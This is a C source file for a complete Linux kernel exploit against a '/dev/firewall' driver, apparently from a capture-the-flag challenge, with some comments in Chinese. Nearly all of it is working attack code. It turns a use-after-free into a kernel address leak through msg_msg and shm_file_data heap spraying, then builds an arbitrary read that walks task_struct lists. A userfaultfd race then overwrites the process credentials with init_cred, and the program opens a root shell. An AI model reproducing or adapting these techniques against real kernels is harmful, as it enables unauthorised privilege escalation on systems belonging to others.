// gcc exp.c  -o exp --static -lpthread -O3 -s
#define _GNU_SOURCE

#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <assert.h>
#include <sched.h>
#include <byteswap.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/timerfd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/reboot.h>
#include <arpa/inet.h>
#include <sys/shm.h>

#define UFFDIO_API 0xc018aa3f
#define UFFDIO_REGISTER 0xc020aa00
#define UFFDIO_UNREGISTER 0x8010aa01
#define UFFDIO_COPY 0xc028aa03
#define UFFDIO_ZEROPAGE 0xc020aa04
#define UFFDIO_WAKE 0x8010aa02

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#define INBOUND 0
#define OUTBOUND 1
#define DESC_MAX 0x800

typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    char desc[DESC_MAX];
} user_rule_t;

typedef struct 
{
        long mtype;
        char mtext[1];
}msg;

typedef struct 
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
}msg_header;

int fd;
uint32_t target_idx;
uint64_t target_addr;
uint32_t target_size;
uint64_t race_page;
pthread_t thread;

uint64_t init_ipc_ns, kbase, init_task, init_cred;

void hexprint(char *buffer, unsigned int bytes) // print like gdb qwords, we round to nearest dqword
{
    int dqwords = ((bytes + 0x10 - 1)&0xfffffff0) / 0x10;
    int qwords = dqwords * 2;
    for (int i = 0; i < qwords; i+=2)
    {
        printf("0x%04llx: 0x%016llx 0x%016llx\n", (i * 0x8), ((size_t*)buffer)[i], ((size_t*)buffer)[i+1]);
    }
    puts("-----------------------------------------------");
    return;
}

gen_dot_notation(char *buf, uint32_t val)
{
    sprintf(buf, "%d.%d.%d.%d", val & 0xff, (val & 0xff00) >> 8, (val & 0xff0000) >> 16, (val & 0xff000000) >> 24);
    return;
}

void generate(char *input, user_rule_t *req)
{
    char addr[0x10];
    uint32_t ip = *(uint32_t *)&input[0x20];        // remain improved
    uint32_t netmask = *(int32_t *)&input[0x24];

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, ip);
    memcpy((void *)req->ip, addr, 0x10);

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, netmask);
    memcpy((void *)req->netmask, addr, 0x10);

    memcpy((void*)req->iface, input, 0x10);
    memcpy((void*)req->name,  (void *)&input[0x10], 0x10);
    memcpy((void*)&req->proto, (void *)&input[0x28], 0x2);
    memcpy((void*)&req->port,  (void *)&input[0x28+2], 0x2);
    memcpy((void*)&req->action,(void *)&input[0x28+4], 0x1);
}

void add(uint8_t idx, char *buffer, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, &rule);
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, ADD_RULE, &rule);
}

void delete(uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, DELETE_RULE, &rule);
}

void edit(uint8_t idx, char *buffer, int type, int invalidate)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, &rule);
    rule.idx = idx;
    rule.type = type;
    if (invalidate)
    {
        strcpy((void *)&rule.ip, "invalid");
        strcpy((void *)&rule.netmask, "invalid");
    }
    ioctl(fd, EDIT_RULE, &rule);
}

void duplicate(uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, DUP_RULE, &rule);
}

void errExit(char* msg1)
{
  puts(msg1);
  exit(-1);
}

static int page_size;

void* handler(void *arg)
{
  struct uffd_msg msg1;
  unsigned long uffd = (unsigned long)arg;
  puts("[+] handler created");

  struct pollfd pollfd;
  int nready;
  pollfd.fd      = uffd;
  pollfd.events  = POLLIN;
  nready = poll(&pollfd, 1, -1);
  if (nready != 1)  // 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE
    errExit("[-] Wrong pool return value");
  printf("[+] Trigger! I'm going to hang\n");

  if (read(uffd, &msg1, sizeof(msg1)) != sizeof(msg1)) // 从uffd读取msg结构，虽然没用
    errExit("[-] Error in reading uffd_msg");
  assert(msg1.event == UFFD_EVENT_PAGEFAULT);
  printf("[+] fault page handler finished\n");
// 1. change msg_msg->m_ts and msg_msg->next,      msg_msg->next = &task_struct->real_cred - 0x8
  char buffer[0x2000];   // 预先设置好buffer内容，往缺页处进行拷贝
  memset(buffer, 0, sizeof(buffer));
  msg_header evil;
  memset((void *)&evil, 0, sizeof(evil));
  evil.ll_next = (void *)0x1337babe;
  evil.ll_prev = (void *)0xbaadf00d;
  evil.m_type = 1;
  evil.m_ts   = 0x1008 - 0x30;              // ????
  evil.next   = (void *)target_addr;        // &task_struct->real_cred - 0x8
  memcpy(buffer, (void *)&evil, sizeof(msg_header));
  edit(target_idx, buffer, OUTBOUND, 0);

// 2. put &init_cred on fault page
  struct uffdio_copy uc;
  memset(buffer, 0x43, sizeof(buffer));
  memcpy((void *)(buffer + 0x1000 - 0x30), (void *)&init_cred, 8);              // msg_msg: 0xfd0  -  real_cred
  memcpy((void *)(buffer + 0x1000 - 0x30 + 8), (void *)&init_cred, 8);          // msg_msg: 0xfd8  -  cred

  uc.src = (unsigned long)buffer;
  uc.dst = (unsigned long)race_page; // (unsigned long) msg1.arg.pagefault.address & ~(page_size - 1);
  uc.len = 0x1000;
  uc.mode = 0;
  uc.copy = 0;
  ioctl(uffd, UFFDIO_COPY, &uc); // 恢复执行copy_from_user
  
  return 0;
}

void register_userfault(uint64_t fault_page, uint64_t fault_page_len, pthread_t thr)
{
  struct uffdio_api ua;
  struct uffdio_register ur;
  // pthread_t thr;

  uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // create the user fault fd
  ua.api = UFFD_API;
  ua.features = 0;
  if (ioctl(uffd, UFFDIO_API, &ua) == -1)
    errExit("[-] ioctl-UFFDIO_API");
  //if (mmap(fault_page, fault_page_len, 7, 0x22, -1, 0) != fault_page) // PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,  //create page used for user fault
  //  errExit("[-] mmap fault page");
  ur.range.start = (unsigned long)fault_page;
  ur.range.len   = fault_page_len;
  ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
    errExit("[-] ioctl-UFFDIO_REGISTER");  //注册页地址与错误处理fd，这样只要copy_from_user
                         //访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
  int s = pthread_create(&thr, NULL, handler, (void*)uffd); // handler函数进行访存错误处理
  if (s!=0)
    errExit("[-] pthread_create");
    return;
}

int main()
{
    fd = open("/dev/firewall", O_RDONLY);
    char buffer[0x2000], received[0x2000];
    memset(buffer, 0, sizeof(buffer));
    memset(received, 0, sizeof(received));
    msg *message = (msg *)buffer;
    int qid, size;

    memset(buffer, 0x41, 0x40);
    for (int i=0x50; i<0x54; i++)
        add(i, buffer, INBOUND);    // rule 0x50 - 0x54
    add(0, buffer, INBOUND);        // rule 0
    duplicate(0, INBOUND);
    qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

// 1. leak kbase
// 1-1. OOB read leak setup: construct UAF kmalloc-4096
    size = 0x1010;
    message->mtype = 1;
    memset(message->mtext, 0x41, size);
    delete(0, INBOUND);     // trigger UAF
// 1-2. use msg_msg to take up the freed chunk
    msgsnd(qid, message, size-0x30, 0);   // kmalloc-4096 + kmalloc-32
// 1-3. spray shm_file_data struct after msg_msgseg
    int shmid;
    char *shmaddr;
    for (int i=0; i<0x50; i++)
    {
        if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1)
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == (void*)-1)
        {
            perror("shmat error");
            exit(-1);
        }
    }
// 1-4. change msg_msg->m_ts bigger
    msg_header evil;
    size = 0x1400;
    memset((void *)&evil, 0, sizeof(msg_header));
    evil.ll_next = (void *)0x4141414141414141;
    evil.ll_prev = (void *)0x4242424242424242;
    evil.m_type = 1;
    evil.m_ts = size;   // 0x1010 -> 0x1400 : OOB read
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer, &evil, 0x20);
    edit(0, buffer, OUTBOUND, 1);
// 1-5. leak shm_file_data->ns
    msgrcv(qid, received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
    for (int i=0; i<size/8; i++)
    {
        if ((*(uint64_t *)(received + i*8) & 0xfff) == 0x7a0)
        {
            printf("[+] init_ipc_ns offset at %d\n", i*8);
            init_ipc_ns = *(uint64_t *)(received + i*8);
            break;
        }
    }
    kbase = init_ipc_ns - (0xffffffff81c3d7a0 - 0xffffffff81000000);
    init_task = kbase + (0xffffffff81c124c0 - 0xffffffff81000000);
    init_cred = kbase + (0xffffffff81c33060 - 0xffffffff81000000);
    printf("[+] init_ipc_ns: 0x%llx\n", init_ipc_ns);
    printf("[+] kbase: 0x%llx\n", kbase);
    printf("[+] init_task: 0x%llx\n", init_task);
    printf("[+] init_cred: 0x%llx\n", init_cred);

// 2. use arb read to traverse task_struct->tasks (at 0x298), find current task_struct via task_struct->pid (at 0x398) 
    int32_t pid, cur_pid;
    int64_t prev, curr;
    cur_pid = getpid();
    printf("current pid:%d\n", cur_pid);

    prev = (void *)init_task + 0x298;
    while (pid != cur_pid)
    {
        curr = prev - 0x298;                    // current task_struct address
        memset((void *)&evil, 0, sizeof(msg_header));
        memset(received, 0, sizeof(received));
        memset(buffer, 0, sizeof(buffer));
        // get task_struct->tasks.prev pointer and task_struct->pid
        evil.m_type = 1;
        evil.m_ts = size;                       // size = 0x1400
        evil.next = (void *)prev -0x8;          // 1 null qword beforehand to avoid crash
        memcpy(buffer, (void *)&evil, sizeof(msg_header));
        edit(0, buffer, OUTBOUND, 0); 
        msgrcv(qid, received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        memcpy((void *)&prev, (void *)(received + 0xfe0), 8);       // 0xfd0 + 0x10        msg_msgseg: null + tasks.next + tasks.prev
        memcpy((void *)&pid, (void *)(received + 0x10d8), 4);       // 0xfd0 + 0x8 + (0x398 - 0x298)
        printf("%d\n", pid);
    }
    printf("[+] found current task struct: 0x%llx\n", curr);

// 3. use arb write to change current_task's real_cred and cred
// 3-1. UAF for arb write
    add(1, buffer, INBOUND);        // rule 1
    duplicate(1, INBOUND);
    delete(1, INBOUND);
// 3-2. change real_cred and cred
    page_size = sysconf(_SC_PAGE_SIZE);
    msg *rooter;
    void *evil_page = mmap(NULL, 4*page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    race_page = evil_page + 0x1000;
    rooter = (msg *)(race_page - 0x8);          // cause fault page at race_page
    rooter->mtype = 1;
    printf("[+] &race_page = %p\n", race_page);

    size = 0x1010;
    target_idx = 1;
    target_addr = curr + 0x538 - 0x8;           // 1 null qword beforehand to avoid crash
    register_userfault(race_page, 0x1000, thread);
    msgsnd(qid, rooter, size - 0x30, 0);        // memory layout:   0xfd0 + 0x10  ->  kmalloc-4096 + kmalloc-32
    pthread_join(thread, NULL);

    printf("uid: %d\n", getuid());
    system("/bin/sh");
}
